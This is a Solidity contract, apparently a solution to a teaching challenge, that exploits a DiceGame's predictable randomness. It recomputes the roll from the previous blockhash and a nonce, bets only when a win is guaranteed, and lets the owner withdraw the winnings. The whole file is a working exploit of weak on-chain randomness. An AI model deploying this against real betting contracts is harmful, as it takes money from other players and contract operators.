// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0 <= 0.9.0;


import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


/**
*@title Rigged Roll.
*@author ABossOfMyself.
*@notice Created a Rigged Roll contract that will predict the randomness ahead of time and only roll the dice when you're guaranteed to be a winner.
*/


contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    uint256 public nonce;



    constructor(address payable diceGameAddress) {

        diceGame = DiceGame(diceGameAddress);
    }



    function riggedRoll() public {

        require(address(this).balance >= 0.002 ether, "Less than required balance!");

        bytes32 previousHash = blockhash(block.number - 1);

        bytes32 hash = keccak256(abi.encodePacked(previousHash, diceGame, nonce));

        uint256 roll = uint256(hash) % 16;

        console.log(roll);

        require(roll <= 2, "Sorry! Try your Luck Again...");

        diceGame.rollTheDice{value: 0.002 ether}();

        nonce ++;
    }



    function withdraw(address to, uint256 amount) public onlyOwner {

        (bool success, ) = to.call{value: amount}("");

        require(success, "Transfer failed!");
    }



    receive() external payable {} 
}